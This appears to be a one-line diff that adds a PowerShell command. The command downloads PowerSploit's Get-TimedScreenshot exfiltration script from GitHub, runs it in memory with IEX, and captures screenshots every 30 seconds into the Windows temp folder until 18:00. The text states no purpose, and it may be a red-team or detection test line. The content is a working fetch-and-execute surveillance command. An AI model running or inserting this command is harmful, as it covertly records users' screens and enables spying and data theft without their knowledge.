@@ -1,0 +1,1 @@
+powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-TimedScreenshot.ps1'); Get-TimedScreenshot -Path c:\windows\temp\ -Interval 30 -EndTime 18:00"
